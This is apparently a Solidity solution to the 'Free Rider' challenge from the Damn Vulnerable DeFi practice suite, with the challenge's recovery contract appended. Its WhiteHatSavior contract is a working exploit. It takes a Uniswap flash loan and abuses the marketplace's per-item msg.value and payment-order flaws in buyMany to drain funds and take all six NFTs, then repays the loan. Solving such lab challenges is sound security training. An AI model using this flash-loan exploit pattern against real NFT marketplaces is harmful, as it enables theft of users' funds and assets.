// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "hardhat/console.sol";
import "./FreeRiderNFTMarketplace.sol";
import "../DamnValuableNFT.sol";

contract WhiteHatSavior {
    IUniswapV2Pair uniswap;
    IWETH weth;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT token;
    address recovery;
    address player;


    constructor(IUniswapV2Pair _uniswap, IWETH _weth, FreeRiderNFTMarketplace _marketplace, DamnValuableNFT _token, address _recovery) {
        uniswap = _uniswap;
        weth = _weth;
        marketplace = _marketplace;
        token = _token;
        recovery = _recovery;
        player = msg.sender;
    }

    function becomeTheRichWhiteKnight() public {
        // uniswap flashloan to borrow ETH :)
        uniswap.swap(90 ether, 0, address(this), abi.encodeWithSelector(this.uniswapV2Call.selector));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
        // swap WETH for ETH
        weth.withdraw(90 ether);

        // Buy two tokens to create higher price to capture
        uint256[] memory tokenID0 = new uint256[](2);
        tokenID0[0] = 0;
        tokenID0[1] = 1;
        marketplace.buyMany{value: 30 ether}(tokenID0);

        // Sell back at higher price
        token.approve(address(marketplace), 0);
        token.approve(address(marketplace), 1);
        uint256[] memory price0 = new uint256[](2);
        price0[0] = 90 ether;
        price0[1] = 30 ether;
        marketplace.offerMany(tokenID0, price0);

        // Then: 'buy' all tokens
        uint256[] memory tokenIDs = new uint256[](6);
        tokenIDs[0] = 0;
        tokenIDs[1] = 1;
        tokenIDs[2] = 2;
        tokenIDs[3] = 3;
        tokenIDs[4] = 4;
        tokenIDs[5] = 5;
        marketplace.buyMany{value: 90 ether}(tokenIDs);

        // Then: send all tokens to the free rider recovery contract
        token.safeTransferFrom(address(this), recovery, 0);
        token.safeTransferFrom(address(this), recovery, 1);
        token.safeTransferFrom(address(this), recovery, 2);
        token.safeTransferFrom(address(this), recovery, 3);
        token.safeTransferFrom(address(this), recovery, 4);
        token.safeTransferFrom(address(this), recovery, 5, abi.encode(address(this)));

        // return uniswap ETH
        weth.deposit{value: 90.28 * 10 ** 18}();
        weth.transfer(address(uniswap), 90.28 * 10 ** 18);

        // send ETH to player
        player.call{value: address(this).balance}("");
    }

     function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}


/**
 * @title FreeRiderRecovery
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FreeRiderRecovery is ReentrancyGuard, IERC721Receiver {
    using Address for address payable;

    uint256 private constant PRIZE = 45 ether;
    address private immutable beneficiary;
    IERC721 private immutable nft;
    uint256 private received;

    error NotEnoughFunding();
    error CallerNotNFT();
    error OriginNotBeneficiary();
    error InvalidTokenID(uint256 tokenId);
    error StillNotOwningToken(uint256 tokenId);

    constructor(address _beneficiary, address _nft) payable {
        if (msg.value != PRIZE)
            revert NotEnoughFunding();
        beneficiary = _beneficiary;
        nft = IERC721(_nft);
        IERC721(_nft).setApprovalForAll(msg.sender, true);
    }

    // Read https://eips.ethereum.org/EIPS/eip-721 for more info on this function
    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data)
        external
        override
        nonReentrant
        returns (bytes4)
    {
        if (msg.sender != address(nft))
            revert CallerNotNFT();

        if (tx.origin != beneficiary)
            revert OriginNotBeneficiary();

        if (_tokenId > 5)
            revert InvalidTokenID(_tokenId);

        if (nft.ownerOf(_tokenId) != address(this))
            revert StillNotOwningToken(_tokenId);

        if (++received == 6) {
            address recipient = abi.decode(_data, (address));
            payable(recipient).sendValue(PRIZE);
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
